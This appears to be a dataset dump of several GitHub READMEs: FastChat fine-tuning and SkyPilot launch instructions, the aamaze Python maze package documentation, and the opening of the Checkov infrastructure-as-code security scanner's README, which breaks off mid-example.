    --lr_scheduler_type ""cosine"" \
    --logging_steps 1 \
    --fsdp ""full_shard auto_wrap"" \
    --fsdp_transformer_layer_cls_to_wrap 'LlamaDecoderLayer' \
    --tf32 True \
    --model_max_length 2048 \
    --gradient_checkpointing True \
    --lazy_preprocess True
```

If you meet out-of-memory during model saving, see solutions [here](https://github.com/pytorch/pytorch/issues/98823).

### Fine-tuning on Any Cloud with SkyPilot
[SkyPilot](https://github.com/skypilot-org/skypilot) is a framework built by UC Berkeley for easily and cost effectively running ML workloads on any cloud (AWS, GCP, Azure, Lambda, etc.). 
To use SkyPilot, install it with the following command and setup the cloud credentials locally following the instructions [here](https://skypilot.readthedocs.io/en/latest/getting-started/installation.html).
```bash
# Install skypilot from the master branch
pip install git+https://github.com/skypilot-org/skypilot.git
```
#### Vicuna
Vicuna can be trained on 8 A100 GPUs with 80GB memory. The following command will automatically launch a node satisfying the requirement, setup and run the training job on it.
```bash
sky launch -c vicuna -s scripts/train-vicuna.yaml --env WANDB_API_KEY
```
Other options are also valid:
```bash
# Launch it on managed spot to save 3x cost (train Vicuna-13B with around $300)
sky spot launch -n vicuna scripts/train-vicuna.yaml --env WANDB_API_KEY

# Train a 7B model
sky launch -c vicuna -s scripts/train-vicuna.yaml --env WANDB_API_KEY --env MODEL_SIZE=7
```
Note: Please make sure the `WANDB_API_KEY` has been setup on your local machine. You can find the API key on your [wandb profile page](https://wandb.ai/authorize). If you would like to train the model without using wandb, you can replace the `--env WANDB_API_KEY` flag with `--env WANDB_MODE=offline`.
",yantao0527/fastchat
aamaze,https://github.com/aaFurze/aamaze,1,9674,9559,"# maze-package
A python package for generating, solving and displaying mazes.

![Tests](https://github.com/aaFurze/aamaze/blob/main/tests/reports/tests-badge.svg)
![Coverage](https://github.com/aaFurze/aamaze/blob/main/tests/reports/coverage-badge.svg)

<br/>

## Contents
 - **Setup**
   - **Pre-requisites/Requirements to use the Package**
   - **Setting up the Virtual Environment**
   - **Installing Dependencies (User Build)**
     - Poetry
     - setup.py
     
  - **Using the Package**
    - **Supported Algorithms**
      - Generating Algorithms
      - Solving Algorithms
    - **Basic use case: Create a Maze and Solution**
    - **Generating a Maze solution at runtime**
    - **Manipulating the solving algorithm at runtime**
    - **Configuring GraphicsApp**
      - Option input types Key
      - Full list of options
    - **Other functionality**
      - Configuring the GrowingTree Maze Generation Algorithm

# Setup
## Pre-requisites/Requirements to use the Package

- Python version 3.7+ (Program originally written using Python 3.9 interpreter)

## Setting up the Virtual Environment
It is good practice to create a virtual environment for this project (and for any other project with non-standard-library dependencies).
See this guide for how to setup and activate a virtual environment: [Python docs](https://packaging.python.org/en/latest/guides/installing-using-pip-and-virtual-environments/#creating-a-virtual-environment ""Python docs"")

_NOTE: Ensure that you activate the environment once you have created it (See Python docs)_
<br/>

## Installing Dependencies (User Build)
_Note: This guide assumes you are in the root project directory_

#### Poetry
If you have poetry installed on your machine, simply run poetry install.
<br/>
<br/>

#### setup.py

To install the relevant packages, select the directory that requirements.txt is in and run the following command:
```
pip install .
```
<br/>
<br/>

To check that all the packages have been installed, run the following command:
```
pip list
```
This should produce an output that contains these items
```
Package    Version
---------- -------
aamaze     latest_version
pip        20.2.3
pygame     2.3.0
setuptools 49.2.1
```

You are now ready to make Mazes!
<br/>
<br/>

# Using the Package
<br/>

### Supported Algorithms
##### Generating Algorithms
 - Eller
 - GrowingTree
 - Kruskals
 - Prims
 - RecursiveBacktracker
 - _RecursiveDivisor_
 - Wilsons

All Generation algorithms (with the exception of RecursiveDivisor) require a maze with all walls filled _(start_filled=True)_
<br/>

##### Solving Algorithms
 - AStarSolver
 - DijkstraSolver
 - FloodFillSolutionCheck

AStarSolver and DijkstraSolver find the shortest path between a Maze's entrance and exit. FloodFillSolutionCheck checks to see if every node in a maze can be reached from every other node.
<br/>
<br/>

### Basic use case: Create a Maze and Solution

Creating a Maze and Solution to a Maze can be done in the following way:

 1. Create a new Maze Object (In this case a 20x10 Maze)
```
from aamaze import Maze
maze = Maze(20, 10, start_filled=True, entrance_index=0, exit_index=-1)
```
 2. Create a new GenerationAlgorithm Object
 3. Run the ""generate_maze"" method on GenerationAlgorithm Object
```
from aamaze.generation import X_GeneratingAlgorithm
X_GenerationAlgorithm(maze).generate_maze()
```
 4. Create a new SolvingAlgorithm
 5. Run the ""solve_maze"" method on SolvingAlgorithm Object
```
from aamaze.solving import Y_SolvingAlgorithm
maze_solver = Y_SolvingAlgorithm(maze)
maze_solver.solve_maze()
```

The Objects you want to keep in this case are ""maze"" and ""maze_solver"". The GenerationAlgorithm can be safely discarded once its ""generate_maze"" has been run.
<br/>
<br/>

### Basic use case: Displaying a Maze and its solution 

To display a maze and its _solution (optional)_:
 1. Generate maze and solution Objects (as shown in _Basic use case: Create a Maze and Solution_).
 2. Create a GraphicsApp Object
```
from aamaze import GraphicsApp
app = GraphicsApp(maze, solver)   # solver is optional
```
 3. Call the ""run"" method on the GraphicsApp Object
``` 
app.run()
```

Calling ""app.run()"" should open a new pygame Window that displays the Maze and its associated Solution (if a solution object is provided).
<br/>
<br/>

### Generating a Maze solution at runtime

aamaze allows for solutions to be generated dynamically while the GraphicsApp is running. To do this:
1. Create a maze using the workflow described in Basic use case: Create a Maze and Solution (1-4) DO NOT run ""solve_maze"" on the SolvingAlgorithm.
```
from aamaze import Maze
from aamaze.generation import X_GeneratingAlgorithm
from aamaze.solving import Y_SolvingAlgorithm

maze = Maze(20, 10, start_filled=True, entrance_index=0, exit_index=-1)
X_GenerationAlgorithm(maze).generate_maze()
maze_solver = Y_SolvingAlgorithm(maze)
```

2. Create a GraphicsApp object
```
from aamaze import GraphicsApp
app = GraphicsApp(maze, maze_solver)
```
3. (Optional) Configure whether a solution starts to be generated as soon as ""app.run()"" is called (start_paused), and the speed of generation (target_steps_per_second). By default, start_paused=False, target_steps_per_second=50
```
app.configure(start_paused=True, target_steps_per_second=50)
```
4. Run the app as usual
```
app.run()
```
<br/>

#### Manipulating the solving algorithm at runtime

Controls for manipulating the solving algorithm at runtime are:
 - [SPACE] to **pause/unpause** solving algorithm generation
 - [S] to **manually run one step** of the solving algorithm
 - [R] to **reset** solving algorithm
 - [+] to **increase** target_steps_per_second (speed of solution generation)
 - [-] to **decrease** target_steps_per_second (speed of solution generation)
<br/>
<br/>

### Configuring GraphicsApp

Below are all options that can be set using the app.configure() method. Options are always set using keyword args (var_x = val_y). Multiple options can be set in the same app.configure call. Available options can be printed via accessing the "".options_list"" property of a GraphicsApp object instance.
Examples:
```
app = GraphicsApp(maze)


app.configure(aspect_ratio=[16, 10])
app.configure(exit_colour=[200, 32, 32], entrance_colour=[32, 200, 32])
app.configure(window_width=1600, wall_colour=[0, 0, 0], show_fps_counter=True)
```
<br/>

#### Option input types Key
 - **Colour:** Set using RGB values between 0 and 255 (inclusive). Takes 3 integers in a List, Tuple or any other object that is subscriptable.
  - e.g. [200, 200, 205], (0, 4, 8), [255, 32, 16]
 - **Pair of Numbers:** Takes 2 numbers in a List, Tuple or any other object that is subscriptable.
  - e.g. [200, 100], (16, 9), [6, 4.5] 
 - **Bool:** Takes a standard python bool.
  - e.g. True, False
 - **Positive Integer:** Takes a standard python integer that is greater than or equal to 0.
  - e.g. 0, 253, 1000000
<br/>

#### Full list of options

 - **aspect_ratio:** Sets the aspect ratio that the GraphicsApp window will open at (e.g. [16, 9]). - **Pair of Numbers**
 - **background_colour:** Sets the background colour of the GraphicsApp window (e.g. [200, 200, 205]). - **Colour**
 - **entrance_colour:** Sets colour of Start/Entrance tile of maze. - **Colour**
 - **exit_colour:** Sets colour of End/Exit tile of maze. - **Colour**
 - **show_fps_counter:** Determines whether fps counter is displayed in the top right of the GraphicsApp window. - **Bool**
 - **show_step_counter:** Determines whether target steps per second counter is displayed in the top right of the GraphicsApp window. - **Bool**
 - **solution_colour:** Sets the colour of solution nodes - **Colour**
 - **start_paused:** Determines whether the maze tries to start generating a solution as soon as GraphicsApp window is opened - **Bool**
 - **target_fps:** Target Frames per Second of the GraphicsApp window. - **Positive Integer**
 - **target_steps_per_second:** Target number of times step() method is called on the SolvingAlgorithm - **Positive Integer**
 - **wall_colour:** Sets colour of maze walls - **Colour**
 - **window_width:** Sets the width of the GraphicsApp window - **Positive Integer**
<br/>
<br/>

### Other functionality

#### Configuring the GrowingTree Maze Generation Algorithm
Currently, GrowingTree is a special GeneratingAlgorithm that allows for editing how a maze is generated. This can be done by setting the **node_selection_mode** attribute to one of three values
 - **random**                   - The next path will start at a random node that has already been visited (approximates Prims Algorithm)
 - **newest**                   - The next path will start at the most recently visited node that still has an unvisited neighbour (approximates Recursive Backtracker Algorithm)
 - **random-newest-split-x**    - The next path has an **x**% probability to start from a random node, and an **x-100**% chance of starting from the most recently visited node with an unvisited neighbour.

See implementation below:
```
maze = Maze(16, 16, start_filled=True)                        # Creating 16x16 maze
growing_tree = GrowingTree(maze)                              # Created GrowingTree instance

growing_tree.node_selection_mode = ""random""                   # Randomly select node
growing_tree.node_selection_mode = ""newest""                   # Select newest node with unvisited neighbour

growing_tree.node_selection_mode = ""random-newest-split-25""   # 25% chance random, 75% change newest
growing_tree.node_selection_mode = ""random-newest-split-50""   # 50% chance random, 50% change newest
growing_tree.node_selection_mode = ""random-newest-split-98""   # 2% chance random, 98% change newest
```

END
","# maze-package
A python package for generating, solving and displaying mazes.

![Tests](https://github.com/aaFurze/aamaze/blob/main/tests/reports/tests-badge.svg)
![Coverage](https://github.com/aaFurze/aamaze/blob/main/tests/reports/coverage-badge.svg)



## Contents
 - **Setup**
   - **Pre-requisites/Requirements to use the Package**
   - **Setting up the Virtual Environment**
   - **Installing Dependencies (User Build)**
     - Poetry
     - setup.py
     
  - **Using the Package**
    - **Supported Algorithms**
      - Generating Algorithms
      - Solving Algorithms
    - **Basic use case: Create a Maze and Solution**
    - **Generating a Maze solution at runtime**
    - **Manipulating the solving algorithm at runtime**
    - **Configuring GraphicsApp**
      - Option input types Key
      - Full list of options
    - **Other functionality**
      - Configuring the GrowingTree Maze Generation Algorithm

# Setup
## Pre-requisites/Requirements to use the Package

- Python version 3.7+ (Program originally written using Python 3.9 interpreter)

## Setting up the Virtual Environment
It is good practice to create a virtual environment for this project (and for any other project with non-standard-library dependencies).
See this guide for how to setup and activate a virtual environment: [Python docs](https://packaging.python.org/en/latest/guides/installing-using-pip-and-virtual-environments/#creating-a-virtual-environment ""Python docs"")

_NOTE: Ensure that you activate the environment once you have created it (See Python docs)_


## Installing Dependencies (User Build)
_Note: This guide assumes you are in the root project directory_

#### Poetry
If you have poetry installed on your machine, simply run poetry install.



#### setup.py

To install the relevant packages, select the directory that requirements.txt is in and run the following command:
```
pip install .
```



To check that all the packages have been installed, run the following command:
```
pip list
```
This should produce an output that contains these items
```
Package    Version
---------- -------
aamaze     latest_version
pip        20.2.3
pygame     2.3.0
setuptools 49.2.1
```

You are now ready to make Mazes!



# Using the Package


### Supported Algorithms
##### Generating Algorithms
 - Eller
 - GrowingTree
 - Kruskals
 - Prims
 - RecursiveBacktracker
 - _RecursiveDivisor_
 - Wilsons

All Generation algorithms (with the exception of RecursiveDivisor) require a maze with all walls filled _(start_filled=True)_


##### Solving Algorithms
 - AStarSolver
 - DijkstraSolver
 - FloodFillSolutionCheck

AStarSolver and DijkstraSolver find the shortest path between a Maze's entrance and exit. FloodFillSolutionCheck checks to see if every node in a maze can be reached from every other node.



### Basic use case: Create a Maze and Solution

Creating a Maze and Solution to a Maze can be done in the following way:

 1. Create a new Maze Object (In this case a 20x10 Maze)
```
from aamaze import Maze
maze = Maze(20, 10, start_filled=True, entrance_index=0, exit_index=-1)
```
 2. Create a new GenerationAlgorithm Object
 3. Run the ""generate_maze"" method on GenerationAlgorithm Object
```
from aamaze.generation import X_GeneratingAlgorithm
X_GenerationAlgorithm(maze).generate_maze()
```
 4. Create a new SolvingAlgorithm
 5. Run the ""solve_maze"" method on SolvingAlgorithm Object
```
from aamaze.solving import Y_SolvingAlgorithm
maze_solver = Y_SolvingAlgorithm(maze)
maze_solver.solve_maze()
```

The Objects you want to keep in this case are ""maze"" and ""maze_solver"". The GenerationAlgorithm can be safely discarded once its ""generate_maze"" has been run.



### Basic use case: Displaying a Maze and its solution 

To display a maze and its _solution (optional)_:
 1. Generate maze and solution Objects (as shown in _Basic use case: Create a Maze and Solution_).
 2. Create a GraphicsApp Object
```
from aamaze import GraphicsApp
app = GraphicsApp(maze, solver)   # solver is optional
```
 3. Call the ""run"" method on the GraphicsApp Object
``` 
app.run()
```

Calling ""app.run()"" should open a new pygame Window that displays the Maze and its associated Solution (if a solution object is provided).



### Generating a Maze solution at runtime

aamaze allows for solutions to be generated dynamically while the GraphicsApp is running. To do this:
1. Create a maze using the workflow described in Basic use case: Create a Maze and Solution (1-4) DO NOT run ""solve_maze"" on the SolvingAlgorithm.
```
from aamaze import Maze
from aamaze.generation import X_GeneratingAlgorithm
from aamaze.solving import Y_SolvingAlgorithm

maze = Maze(20, 10, start_filled=True, entrance_index=0, exit_index=-1)
X_GenerationAlgorithm(maze).generate_maze()
maze_solver = Y_SolvingAlgorithm(maze)
```

2. Create a GraphicsApp object
```
from aamaze import GraphicsApp
app = GraphicsApp(maze, maze_solver)
```
3. (Optional) Configure whether a solution starts to be generated as soon as ""app.run()"" is called (start_paused), and the speed of generation (target_steps_per_second). By default, start_paused=False, target_steps_per_second=50
```
app.configure(start_paused=True, target_steps_per_second=50)
```
4. Run the app as usual
```
app.run()
```


#### Manipulating the solving algorithm at runtime

Controls for manipulating the solving algorithm at runtime are:
 - [SPACE] to **pause/unpause** solving algorithm generation
 - [S] to **manually run one step** of the solving algorithm
 - [R] to **reset** solving algorithm
 - [+] to **increase** target_steps_per_second (speed of solution generation)
 - [-] to **decrease** target_steps_per_second (speed of solution generation)



### Configuring GraphicsApp

Below are all options that can be set using the app.configure() method. Options are always set using keyword args (var_x = val_y). Multiple options can be set in the same app.configure call. Available options can be printed via accessing the "".options_list"" property of a GraphicsApp object instance.
Examples:
```
app = GraphicsApp(maze)


app.configure(aspect_ratio=[16, 10])
app.configure(exit_colour=[200, 32, 32], entrance_colour=[32, 200, 32])
app.configure(window_width=1600, wall_colour=[0, 0, 0], show_fps_counter=True)
```


#### Option input types Key
 - **Colour:** Set using RGB values between 0 and 255 (inclusive). Takes 3 integers in a List, Tuple or any other object that is subscriptable.
  - e.g. [200, 200, 205], (0, 4, 8), [255, 32, 16]
 - **Pair of Numbers:** Takes 2 numbers in a List, Tuple or any other object that is subscriptable.
  - e.g. [200, 100], (16, 9), [6, 4.5] 
 - **Bool:** Takes a standard python bool.
  - e.g. True, False
 - **Positive Integer:** Takes a standard python integer that is greater than or equal to 0.
  - e.g. 0, 253, 1000000


#### Full list of options

 - **aspect_ratio:** Sets the aspect ratio that the GraphicsApp window will open at (e.g. [16, 9]). - **Pair of Numbers**
 - **background_colour:** Sets the background colour of the GraphicsApp window (e.g. [200, 200, 205]). - **Colour**
 - **entrance_colour:** Sets colour of Start/Entrance tile of maze. - **Colour**
 - **exit_colour:** Sets colour of End/Exit tile of maze. - **Colour**
 - **show_fps_counter:** Determines whether fps counter is displayed in the top right of the GraphicsApp window. - **Bool**
 - **show_step_counter:** Determines whether target steps per second counter is displayed in the top right of the GraphicsApp window. - **Bool**
 - **solution_colour:** Sets the colour of solution nodes - **Colour**
 - **start_paused:** Determines whether the maze tries to start generating a solution as soon as GraphicsApp window is opened - **Bool**
 - **target_fps:** Target Frames per Second of the GraphicsApp window. - **Positive Integer**
 - **target_steps_per_second:** Target number of times step() method is called on the SolvingAlgorithm - **Positive Integer**
 - **wall_colour:** Sets colour of maze walls - **Colour**
 - **window_width:** Sets the width of the GraphicsApp window - **Positive Integer**



### Other functionality

#### Configuring the GrowingTree Maze Generation Algorithm
Currently, GrowingTree is a special GeneratingAlgorithm that allows for editing how a maze is generated. This can be done by setting the **node_selection_mode** attribute to one of three values
 - **random**                   - The next path will start at a random node that has already been visited (approximates Prims Algorithm)
 - **newest**                   - The next path will start at the most recently visited node that still has an unvisited neighbour (approximates Recursive Backtracker Algorithm)
 - **random-newest-split-x**    - The next path has an **x**% probability to start from a random node, and an **x-100**% chance of starting from the most recently visited node with an unvisited neighbour.

See implementation below:
```
maze = Maze(16, 16, start_filled=True)                        # Creating 16x16 maze
growing_tree = GrowingTree(maze)                              # Created GrowingTree instance

growing_tree.node_selection_mode = ""random""                   # Randomly select node
growing_tree.node_selection_mode = ""newest""                   # Select newest node with unvisited neighbour

growing_tree.node_selection_mode = ""random-newest-split-25""   # 25% chance random, 75% change newest
growing_tree.node_selection_mode = ""random-newest-split-50""   # 50% chance random, 50% change newest
growing_tree.node_selection_mode = ""random-newest-split-98""   # 2% chance random, 98% change newest
```

END
",aafurze/aamaze
psgraph,https://github.com/bridgecrewio/checkov,50,22220,21434,"[![checkov](https://raw.githubusercontent.com/bridgecrewio/checkov/master/docs/web/images/checkov_by_bridgecrew.png)](#)
       
[![Maintained by Bridgecrew.io](https://img.shields.io/badge/maintained%20by-bridgecrew.io-blueviolet)](https://bridgecrew.io/?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov)
[![build status](https://github.com/bridgecrewio/checkov/workflows/build/badge.svg)](https://github.com/bridgecrewio/checkov/actions?query=workflow%3Abuild)
[![security status](https://github.com/bridgecrewio/checkov/workflows/security/badge.svg)](https://github.com/bridgecrewio/checkov/actions?query=event%3Apush+branch%3Amaster+workflow%3Asecurity) 
[![code_coverage](https://raw.githubusercontent.com/bridgecrewio/checkov/master/coverage.svg?sanitize=true)](https://github.com/bridgecrewio/checkov/actions?query=workflow%3Acoverage) 
[![docs](https://img.shields.io/badge/docs-passing-brightgreen)](https://www.checkov.io/1.Welcome/What%20is%20Checkov.html?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov)
[![PyPI](https://img.shields.io/pypi/v/checkov)](https://pypi.org/project/checkov/)
[![Python Version](https://img.shields.io/pypi/pyversions/checkov)](#)
[![Terraform Version](https://img.shields.io/badge/tf-%3E%3D0.12.0-blue.svg)](#)
[![Downloads](https://pepy.tech/badge/checkov)](https://pepy.tech/project/checkov)
[![Docker Pulls](https://img.shields.io/docker/pulls/bridgecrew/checkov.svg)](https://hub.docker.com/r/bridgecrew/checkov)
[![slack-community](https://img.shields.io/badge/Slack-4A154B?style=plastic&logo=slack&logoColor=white)](https://slack.bridgecrew.io/)
 

**Checkov** is a static code analysis tool for infrastructure as code (IaC) and also a software composition analysis (SCA) tool for images and open source packages.

It scans cloud infrastructure provisioned using [Terraform](https://terraform.io/), [Terraform plan](docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](docs/7.Scan%20Examples/Helm.md), [Kustomize](docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](docs/7.Scan%20Examples/Dockerfile.md),  [Serverless](docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](docs/7.Scan%20Examples/Bicep.md), [OpenAPI](docs/7.Scan%20Examples/OpenAPI.md) or [ARM Templates](docs/7.Scan%20Examples/Azure%20ARM%20templates.md) and detects security and compliance misconfigurations using graph-based scanning.

It performs [Software Composition Analysis (SCA) scanning](docs/7.Scan%20Examples/Sca.md) which is a scan of open source packages and images for Common Vulnerabilities and Exposures (CVEs).
 
Checkov also powers [**Bridgecrew**](https://bridgecrew.io/?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov), the developer-first platform that codifies and streamlines cloud security throughout the development lifecycle. Bridgecrew identifies, fixes, and prevents misconfigurations in cloud resources and infrastructure-as-code files. 

<a href=""https://www.bridgecrew.cloud/login/signUp/?utm_campaign=checkov-github-repo&utm_source=github.com&utm_medium=get-started-button"" title=""Try_Bridgecrew"">
    <img src=""https://dabuttonfactory.com/button.png?t=Try+Bridgecrew&f=Open+Sans-Bold&ts=26&tc=fff&hp=45&vp=20&c=round&bgt=unicolored&bgc=662eff"" align=""right"" width=""120"">
</a>


<a href=""https://docs.bridgecrew.io?utm_campaign=checkov-github-repo&utm_source=github.com&utm_medium=read-docs-button"" title=""Docs"">
    <img src=""https://dabuttonfactory.com/button.png?t=Read+the+Docs&f=Open+Sans-Bold&ts=26&tc=fff&hp=45&vp=20&c=round&bgt=unicolored&bgc=662eff"" align=""right"" width=""120"">
</a>

## **Table of contents**

- [Features](#features)
- [Screenshots](#screenshots)
- [Getting Started](#getting-started)
- [Disclaimer](#disclaimer)
- [Support](#support)

 ## Features

 * [Over 1000 built-in policies](docs/5.Policy%20Index/all.md) cover security and compliance best practices for AWS, Azure and Google Cloud.
 * Scans Terraform, Terraform Plan, Terraform JSON, CloudFormation, AWS SAM, Kubernetes, Helm, Kustomize, Dockerfile, Serverless framework, Ansible, Bicep and ARM template files.
 * Scans Argo Workflows, Azure Pipelines, BitBucket Pipelines, Circle CI Pipelines, GitHub Actions and GitLab CI workflow files
 * Supports Context-awareness policies based on in-memory graph-based scanning.
 * Supports Python format for attribute policies and YAML format for both attribute and composite policies.
 * Detects [AWS credentials](docs/2.Basics/Scanning%20Credentials%20and%20Secrets.md) in EC2 Userdata, Lambda environment variables and Terraform providers.
 * [Identifies secrets](https://bridgecrew.io/blog/checkov-secrets-scanning-find-exposed-credentials-in-iac/) using regular expressions, keywords, and entropy based detection.
 * Evaluates [Terraform Provider](https://registry.terraform.io/browse/providers) settings to regulate the creation, management, and updates of IaaS, PaaS or SaaS managed through Terraform.
 * Policies support evaluation of [variables](docs/2.Basics/Handling%20Variables.md) to their optional default value.
 * Supports in-line [suppression](docs/2.Basics/Suppressing%20and%20Skipping%20Policies.md) of accepted risks or false-positives to reduce recurring scan failures. Also supports global skip from using CLI.
 * [Output](docs/2.Basics/Reviewing%20Scan%20Results.md) currently available as CLI, [CycloneDX](https://cyclonedx.org), JSON, JUnit XML, CSV, SARIF and github markdown and link to remediation [guides](https://docs.bridgecrew.io/docs/aws-policy-index).
 
## Screenshots

Scan results in CLI

![scan-screenshot](https://raw.githubusercontent.com/bridgecrewio/checkov/master/docs/checkov-recording.gif)

Scheduled scan result in Jenkins

![jenikins-screenshot](https://raw.githubusercontent.com/bridgecrewio/checkov/master/docs/checkov-jenkins.png)

## Getting started

### Requirements
 * Python >= 3.7 (Data classes are available for Python 3.7+)
 * Terraform >= 0.12

### Installation

```sh
pip3 install checkov
```

Installation on Alpine:
```sh
pip3 install --upgrade pip && pip3 install --upgrade setuptools
pip3 install checkov
```

Installation on Ubuntu 18.04 LTS:

Ubuntu 18.04 ships with Python 3.6. Install python 3.7 (from ppa repository)

```sh
sudo apt update
sudo apt install software-properties-common
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt install python3.7
sudo apt install python3-pip
sudo python3.7 -m pip install -U checkov #to install or upgrade checkov)
```

or using [homebrew](https://formulae.brew.sh/formula/checkov) (macOS or Linux)

```sh
brew install checkov
```

or

```sh
brew upgrade checkov
```

### Enabling bash autocomplete
```sh
source <(register-python-argcomplete checkov)
```
### Upgrade

if you installed checkov with pip3
```sh
pip3 install -U checkov
```

### Configure an input folder or file

```sh
checkov --directory /user/path/to/iac/code
```

Or a specific file or files

```sh
checkov --file /user/tf/example.tf
```
Or
```sh
checkov -f /user/cloudformation/example1.yml -f /user/cloudformation/example2.yml
```

Or a terraform plan file in json format
```sh
terraform init
terraform plan -out tf.plan
terraform show -json tf.plan  > tf.json 
checkov -f tf.json
```
Note: `terraform show` output file `tf.json` will be a single line. 
For that reason all findings will be reported line number 0 by checkov
```sh
check: CKV_AWS_21: ""Ensure all data stored in the S3 bucket have versioning enabled""
	FAILED for resource: aws_s3_bucket.customer
	File: /tf/tf.json:0-0
	Guide: https://docs.bridgecrew.io/docs/s3_16-enable-versioning
  ```

If you have installed `jq` you can convert json file into multiple lines with the following command:
```sh
terraform show -json tf.plan | jq '.' > tf.json 
```
Scan result would be much user friendly.
```sh
checkov -f tf.json
Check: CKV_AWS_21: ""Ensure all data stored in the S3 bucket have versioning enabled""
	FAILED for resource: aws_s3_bucket.customer
	File: /tf/tf1.json:224-268
	Guide: https://docs.bridgecrew.io/docs/s3_16-enable-versioning

		225 |               ""values"": {
		226 |                 ""acceleration_status"": """",
		227 |                 ""acl"": ""private"",
		228 |                 ""arn"": ""arn:aws:s3:::mybucket"",

```

Alternatively, specify the repo root of the hcl files used to generate the plan file, using the `--repo-root-for-plan-enrichment` flag, to enrich the output with the appropriate file path, line numbers, and codeblock of the resource(s). An added benefit is that check suppressions will be handled accordingly.
```sh
checkov -f tf.json --repo-root-for-plan-enrichment /user/path/to/iac/code
```


### Scan result sample (CLI)

```sh
Passed Checks: 1, Failed Checks: 1, Suppressed Checks: 0
Check: ""Ensure all data stored in the S3 bucket is securely encrypted at rest""
/main.tf:
	 Passed for resource: aws_s3_bucket.template_bucket 
Check: ""Ensure all data stored in the S3 bucket is securely encrypted at rest""
/../regionStack/main.tf:
	 Failed for resource: aws_s3_bucket.sls_deployment_bucket_name       
```

Start using Checkov by reading the [Getting Started](docs/1.Welcome/Quick%20Start.md) page.

### Using Docker


```sh
docker pull bridgecrew/checkov
docker run --tty --rm --volume /user/tf:/tf --workdir /tf bridgecrew/checkov --directory /tf
```
Note: if you are using Python 3.6(Default version in Ubuntu 18.04) checkov will not work and it will fail with `ModuleNotFoundError: No module named 'dataclasses'`  error message. In this case, you can use the docker version instead.

Note that there are certain cases where redirecting `docker run --tty` output to a file - for example, if you want to save the Checkov JUnit output to a file - will cause extra control characters to be printed. This can break file parsing. If you encounter this, remove the `--tty` flag.

The `--workdir /tf` flag is optional to change the working directory to the mounted volume. If you are using the SARIF output `-o sarif` this will output the results.sarif file to the mounted volume (`/user/tf` in the example above). If you do not include that flag, the working directory will be ""/"".

### Running or skipping checks 

By using command line flags, you can specify to run only named checks (allow list) or run all checks except 
those listed (deny list). If you are using the platform integration via API key, you can also specify a severity threshold to skip and / or include.
Moreover, as json files can't contain comments, one can pass regex pattern to skip json file secret scan.

See the docs for more detailed information about how these flags work together.
   

## Examples

Allow only the two specified checks to run: 
```sh
checkov --directory . --check CKV_AWS_20,CKV_AWS_57
```

Run all checks except the one specified:
```sh
checkov -d . --skip-check CKV_AWS_20
```

Run all checks except checks with specified patterns:
```sh
checkov -d . --skip-check CKV_AWS*
```

Run all checks that are MEDIUM severity or higher (requires API key):
```sh
checkov -d . --check MEDIUM --bc-api-key ...
```

Run all checks that are MEDIUM severity or higher, as well as check CKV_123 (assume this is a LOW severity check):
```sh
checkov -d . --check MEDIUM,CKV_123 --bc-api-key ...
```

Skip all checks that are MEDIUM severity or lower:
```sh
checkov -d . --skip-check MEDIUM --bc-api-key ...
```

Skip all checks that are MEDIUM severity or lower, as well as check CKV_789 (assume this is a high severity check):
```sh
checkov -d . --skip-check MEDIUM,CKV_789 --bc-api-key ...
```

Run all checks that are MEDIUM severity or higher, but skip check CKV_123 (assume this is a medium or higher severity check):
```sh
checkov -d . --check MEDIUM --skip-check CKV_123 --bc-api-key ...
```

Run check CKV_789, but skip it if it is a medium severity (the --check logic is always applied before --skip-check)
```sh
checkov -d . --skip-check MEDIUM --check CKV_789 --bc-api-key ...
```

For Kubernetes workloads, you can also use allow/deny namespaces.  For example, do not report any results for the 
kube-system namespace:
```sh
checkov -d . --skip-check kube-system
```

Run a scan of a container image. First pull or build the image then refer to it by the hash, ID, or name:tag:
```sh
checkov --framework sca_image --docker-image sha256:1234example --dockerfile-path /Users/path/to/Dockerfile --bc-api-key ...

checkov --docker-image <image-name>:tag --dockerfile-path /User/path/to/Dockerfile --bc-api-key ...
```

You can use --image flag also to scan container image instead of --docker-image for shortener:
```sh
checkov --image <image-name>:tag --dockerfile-path /User/path/to/Dockerfile --bc-api-key ...
```

Run an SCA scan of packages in a repo:
```sh
checkov -d . --framework sca_package --bc-api-key ... --repo-id <repo_id(arbitrary)>
```

Run a scan of a directory with environment variables removing buffering, adding debug level logs:
```sh
PYTHONUNBUFFERED=1 LOG_LEVEL=DEBUG checkov -d .
```
OR enable the environment variables for multiple runs
```sh
export PYTHONUNBUFFERED=1 LOG_LEVEL=DEBUG
checkov -d .
```

Run secrets scanning on all files in MyDirectory. Skip CKV_SECRET_6 check on json files that their suffix is DontScan
```sh
checkov -d /MyDirectory --framework secrets --bc-api-key ... --skip-check CKV_SECRET_6:.*DontScan.json$
```

Run secrets scanning on all files in MyDirectory. Skip CKV_SECRET_6 check on json files that contains ""skip_test"" in path
```sh
checkov -d /MyDirectory --framework secrets --bc-api-key ... --skip-check CKV_SECRET_6:.*skip_test.*json$
```

One can mask values from scanning results by supplying a configuration file (using --config-file flag) with mask entry.
The masking can apply on resource & value (or multiple values, seperated with a comma). 
Examples:
```sh
mask:
- aws_instance:user_data
- azurerm_key_vault_secret:admin_password,user_passwords
```
In the example above, the following values will be masked:
- user_data for aws_instance resource
- both admin_password &user_passwords for azurerm_key_vault_secret


### Suppressing/Ignoring a check

Like any static-analysis tool it is limited by its analysis scope. 
For example, if a resource is managed manually, or using subsequent configuration management tooling, 
suppression can be inserted as a simple code annotation.

#### Suppression comment format

To skip a check on a given Terraform definition block or CloudFormation resource, apply the following comment pattern inside it's scope:

`checkov:skip=<check_id>:<suppression_comment>`

* `<check_id>` is one of the [available check scanners](docs/5.Policy Index/all.md)
* `<suppression_comment>` is an optional suppression reason to be included in the output

#### Example

The following comment skips the `CKV_AWS_20` check on the resource identified by `foo-bucket`, where the scan checks if an AWS S3 bucket is private.
In the example, the bucket is configured with public read access; Adding the suppress comment would skip the appropriate check instead of the check to fail.

```hcl-terraform
resource ""aws_s3_bucket"" ""foo-bucket"" {
  region        = var.region
